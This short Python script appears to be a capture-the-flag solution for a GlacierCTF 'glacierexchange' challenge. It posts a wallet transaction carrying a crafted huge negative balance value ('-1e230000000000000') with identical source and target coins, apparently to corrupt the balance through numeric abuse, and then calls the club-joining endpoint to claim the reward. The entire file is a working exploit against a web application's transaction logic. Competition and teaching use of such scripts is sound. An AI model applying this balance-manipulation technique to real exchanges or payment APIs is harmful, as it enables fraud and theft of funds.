import requests

session = requests.session()

url = "https://glacierexchange.web.glacierctf.com:443/api/wallet/transaction"
json={"balance": "-1e230000000000000", "sourceCoin": "cashout", "targetCoin": "cashout"}
res = session.post(url, json=json)
print(res.text)

join_url = "https://glacierexchange.web.glacierctf.com:443/api/wallet/join_glacier_club"
res = session.post(join_url)
print(res.text)